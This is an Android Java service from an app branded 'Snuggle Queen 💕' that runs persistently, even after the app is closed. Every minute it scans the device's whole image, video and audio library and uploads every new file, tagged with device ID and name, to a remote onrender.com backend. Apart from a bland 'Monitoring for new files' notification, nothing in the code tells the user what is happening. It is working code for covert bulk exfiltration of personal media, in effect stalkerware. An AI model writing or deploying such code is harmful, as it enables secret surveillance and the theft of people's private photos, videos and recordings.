package com.snugglequeen.yobby;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.provider.MediaStore;
import android.database.Cursor;
import android.net.Uri;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * UploadService — foreground service that continuously monitors for new
 * media files and uploads them to the Render backend.
 * Runs even when the app is closed.
 */
public class UploadService extends Service {

    private static final String CHANNEL_ID = "snuggle_queen_upload";
    private static final int NOTIFICATION_ID = 1;
    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
    private static final long SCAN_INTERVAL = 60000; // 60 seconds

    private String deviceId = "";
    private String deviceName = "";
    private Set<String> uploadedPaths = new HashSet<>();
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Snuggle Queen 💕")
                .setContentText("Monitoring for new files...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setOngoing(true)
                .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            deviceId = intent.getStringExtra("deviceId");
            deviceName = intent.getStringExtra("deviceName");
            if (deviceId == null) deviceId = "unknown";
            if (deviceName == null) deviceName = "Unknown Device";
        }

        // Start continuous scanning loop
        new Thread(() -> {
            while (running) {
                scanForNewFiles();
                try {
                    Thread.sleep(SCAN_INTERVAL);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();

        return START_STICKY;
    }

    private void scanForNewFiles() {
        List<String> currentFiles = new ArrayList<>();

        // Scan images
        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media.DATA},
                null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                if (path != null) currentFiles.add(path);
            }
            cursor.close();
        }

        // Scan videos
        cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media.DATA},
                null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                if (path != null) currentFiles.add(path);
            }
            cursor.close();
        }

        // Scan audio
        cursor = getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Audio.Media.DATA},
                null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.DATA));
                if (path != null) currentFiles.add(path);
            }
            cursor.close();
        }

        // Upload any new files
        for (String path : currentFiles) {
            if (!uploadedPaths.contains(path)) {
                File file = new File(path);
                if (file.exists() && file.length() > 0) {
                    try {
                        uploadFile(path);
                        uploadedPaths.add(path);
                    } catch (Exception e) {
                        // Will retry next scan
                    }
                }
            }
        }
    }

    private void uploadFile(String filePath) throws Exception {
        File file = new File(filePath);
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL(BACKEND_URL + "/api/upload");

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setRequestProperty("X-Device-Id", deviceId);
        conn.setRequestProperty("X-Device-Name", deviceName);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);

        OutputStream os = conn.getOutputStream();
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());

        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
        fis.close();

        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
        os.flush();
        os.close();
        conn.getResponseCode();
        conn.disconnect();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Snuggle Queen Sync", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
